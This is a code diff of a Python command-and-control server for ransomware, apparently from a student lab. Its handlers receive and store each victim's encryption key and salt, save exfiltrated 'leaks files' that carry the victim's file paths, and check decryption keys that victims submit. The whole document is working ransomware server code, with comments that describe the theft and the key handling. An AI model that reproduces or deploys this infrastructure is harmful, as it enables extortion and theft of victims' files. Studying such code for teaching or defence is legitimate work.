@@ -20,26 +20,27 @@ class CNC(CNCBase):
         with open(path, "wb") as f:
             f.write(bin_data)
 
+
+    """
+        Function raise when the HTTP server receive a
+        POST request on the URI /new
+    """
     def post_new(self, path:str, params:dict, body:dict)->dict:
         
         os.makedirs('/root/CNC', exist_ok=True)
-        print(os.listdir())
 
+        # Decode the values
         token = base64.b64decode(body["token"])
         salt = base64.b64decode(body["salt"])
         key = base64.b64decode(body["key"])
 
-        print("\n\nKey "+token.hex()+": ", str(base64.b64encode(key), encoding="utf-8"))
+        # Print the key for fast uncrypt
+        print("\n\nKEY "+token.hex()[0:10]+"... : ", 
+                str(base64.b64encode(key), encoding="utf-8"))
 
-        # Create folder's name
-        #m = sha256()
-        #m.update(token)
-        folder_token_name = "/root/CNC/" + str(token.hex()) #str(m.hexdigest())
-
+        # Create folder token
+        folder_token_name = CNC.ROOT_PATH + str(token.hex())
         os.makedirs(folder_token_name, exist_ok=True)
-
-        # LOG
-        os.chdir(folder_token_name)
 
         with open(folder_token_name + "/key.bin", "wb") as f:
             f.write(key)
@@ -47,54 +48,73 @@ class CNC(CNCBase):
         with open(folder_token_name + "/salt.bin", "wb") as f:
             f.write(salt)
 
+        return {"status":"OK"}
 
-        print(os.getcwd()) 
-        print(os.listdir())
-
-        return {"status":"KO"}
-
+    """
+        Function raise when the HTTP server receive a
+        POST request on the URI /files
+    """
     def post_files(self, path:str, params:dict, body:dict)->dict:
-        os.makedirs("/root/CNC/files/", exist_ok=True)
-        os.chdir("/root/CNC/files")
-        print("POST_FILES:", body)
 
+        # Obtain the token for authentificated the client
         token = base64.b64decode(body["token"])
 
+        # Obtain the keys in the dictionnary
+        # The keys correspond to the file's path in the client computer
         key = list(body.keys())
-        print(key[1])
-        path = "/root/CNC/" + token.hex() #+ key[1]
-        
-        TODO manipuler le chemin d'accès pour créer les folders 
-        
-        #os.makedirs("/root/CNC/files/", exist_ok=True)
-        with open(path, "w") as f:
-            f.write(body[key[1]])
+
+        # Create folder for saving the files 
+        # in the corresponding folder
+        path = CNC.ROOT_PATH + token.hex() + "/files/"
+        os.makedirs(path,  exist_ok=True)
+
+        path = path + "file_"
+
+
+        # Save the leaks files
+        # In this example, just the first one
+        # Use len(body) in the range function
+        # for saving all the files
+        for i in range(1,2):
+            name_file = path + str(i) +".txt"
+            with open(name_file, "w+") as f:
+
+                f.write(key[i] + "\n\n")
+                f.write(body[key[i]])
 
         return {}
 
+    # Encode binary to base64
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
+    
 
+    """
+        Function raise when the HTTP server receive a
+        POST request on the URI /key
+        This function is used for the key verification step
+    """
     def post_key(self, path:str, params:dict, body:dict)->dict:
 
+        # Obtain the token for authentificated the client
         token = base64.b64decode(body["token"])
-        #m = sha256()
-        #m.update(token)
+
         folder_token_name = "/root/CNC/" + token.hex() # str(m.hexdigest())
         file_path = folder_token_name + "/key.bin"
         
+         # Obtain the candidate key from the client
         key_rcv = base64.b64decode(body["key"])
 
         try:
             f = open(file_path, "rb")
             key = f.read()
-        except:
+        except: # Token error
             f.close()
-            return {"valide":-1}
+            return {"valide":-1} 
         f.close()
-        print(key_rcv)
-        print(key)
+
+        # Key verification
         if(key_rcv == key):
 
             return {"valide": 1}
